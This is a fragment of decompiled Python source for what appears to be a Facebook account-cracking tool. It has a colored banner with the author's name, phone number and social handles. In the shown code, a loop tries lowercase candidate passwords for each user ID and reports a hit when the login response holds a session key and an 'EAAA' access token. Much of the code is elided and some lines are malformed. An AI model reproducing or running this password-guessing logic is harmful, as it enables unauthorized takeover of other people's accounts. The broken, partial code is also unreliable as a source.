# Decompile by Mardis (Tools By Md. MUHIT )
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
\033[1;32m║════════════════════════║
\033[1;32m║AUTHOR    : MD ISLAM  ║║ \x1b[1;91m
\033[1;32m║═════════════════════ ═══║
\033[1;32m║WHATSAPP  : +8801978641519             ║
\033[1;32m║══════════════════════════
\033[1;32m║GITHUB    : DARK-MUHIT                       ║
\033[1;32m║════════════════════════  ║
\033[1;32m║SERVER    : DATA - WIFI WORKING        
\033[1;32m║═════════════════════════
\033[1;32m║FACEBOOK : MUHIT ISLAM                          ║
\033[1;32m║═════════════════════════
\033[1;32m║   this best tools
\033[1;32m╚════════════════════════
def ud():
 \033[1;32m[\033[0;41;37m==========={ AUTHER M.I 🔥\033[0;37;41m M.I }===========\033[1;37;40m\033[1;32m] \033[1;37;40m     
   """
...
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[M.IR - CYBER] : %s/%s -> \033[0;97m [OK:%s ] \033[0;97m[OK:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \'\033[1;32m'    [M.I-OK🌻] %s | %s\033[0;97m         "%(uid, pw))
